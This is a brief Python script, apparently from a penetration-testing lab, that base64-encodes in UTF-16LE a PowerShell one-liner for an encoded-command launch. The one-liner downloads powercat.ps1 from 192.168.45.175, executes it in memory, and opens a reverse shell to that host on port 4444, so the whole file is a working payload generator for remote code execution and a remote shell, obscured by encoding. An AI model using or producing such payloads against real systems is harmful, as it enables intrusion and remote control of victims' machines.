import base64

text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.175/powercat.ps1');powercat -c 192.168.45.175 -p 4444 -e powershell"

payload = base64.b64encode(bytes(text, 'utf-16-le')).decode('utf-8')

print("Payload, base64 encoded in UTF-16LE:", payload)


